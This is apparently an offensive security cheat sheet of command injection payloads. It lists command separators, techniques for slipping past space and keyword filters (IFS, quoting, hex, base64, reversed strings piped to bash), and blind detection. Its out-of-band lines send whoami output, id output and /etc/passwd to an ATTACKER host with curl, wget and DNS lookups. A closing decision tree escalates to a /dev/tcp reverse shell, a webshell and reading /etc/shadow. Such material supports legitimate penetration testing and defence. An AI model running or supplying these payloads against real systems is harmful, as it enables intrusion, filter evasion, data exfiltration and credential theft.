# Command Injection Payloads

## Separators

```bash
# Command separators (try each)
; id                    # sequential execution
| id                    # pipe (output to next command)
|| id                   # OR (execute if previous fails)
& id                    # background execution
&& id                   # AND (execute if previous succeeds)
`id`                    # backtick substitution
$(id)                   # dollar substitution
\n id                   # newline (%0a URL-encoded)
```

## Space Bypass

```bash
# $IFS (Internal Field Separator = space/tab/newline)
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd       # $9 = empty positional param (separator)
cat${IFS%%?}/etc/passwd

# Brace expansion
{cat,/etc/passwd}
{ls,-la,/tmp}

# Tab
cat%09/etc/passwd          # URL-encoded tab

# Redirect trick
cat</etc/passwd

# $() with spaces inside
$(cat${IFS}/etc/passwd)
```

## Keyword / Character Bypass

```bash
# Quotes break up keywords (invisible to shell)
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Wildcards
cat /etc/pass??
cat /etc/passw*
cat /etc/pas[s]wd

# Variable concatenation
a=ca;b=t;$a$b /etc/passwd

# Hex / octal encoding (bash)
$'\x63\x61\x74' /etc/passwd         # cat
$'\143\141\164' /etc/passwd          # cat (octal)

# Base64 execution
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# printf
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# rev (reverse)
echo 'dwssap/cte/ tac' | rev | bash
```

## Blind Command Injection

```bash
# Time-based detection
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
& ping -c 5 127.0.0.1 &

# Out-of-band (OOB) — DNS
; nslookup ATTACKER.com
; nslookup $(whoami).ATTACKER.com
; host $(cat /etc/hostname).ATTACKER.com

# Out-of-band — HTTP
; curl http://ATTACKER/$(whoami)
; wget http://ATTACKER/$(id|base64) -O /dev/null
| curl http://ATTACKER -d @/etc/passwd

# File write (then retrieve)
; id > /var/www/html/output.txt
```

## Windows Command Injection

```cmd
& dir
| dir
&& dir
|| dir

:: Windows-specific bypasses
set a=who&& set b=ami&& %a%%b%
cmd /V /C "set a=id&&!a!"

:: PowerShell
; powershell -c "Get-Process"
| powershell -enc BASE64_COMMAND
```

## Decision Tree

```
1. Test separators: ;, |, ||, &, &&, ``, $()
   └── Got output? → Classic injection → extract data
   └── No output?  → Try blind techniques (step 2)

2. Blind detection: ; sleep 5
   └── Delayed? → Time-based blind → use OOB to extract
   └── Not delayed? → Try URL encoding, double encoding

3. Filtered? → Try bypass:
   └── Spaces blocked → $IFS, {cmd,arg}, %09
   └── Keywords blocked → quotes, wildcards, hex, base64
   └── Semicolons blocked → |, ||, &&, newline (%0a), $()

4. Got execution → escalate:
   └── Reverse shell: bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
   └── File write: webshell
   └── Credential extraction: /etc/shadow, config files
```
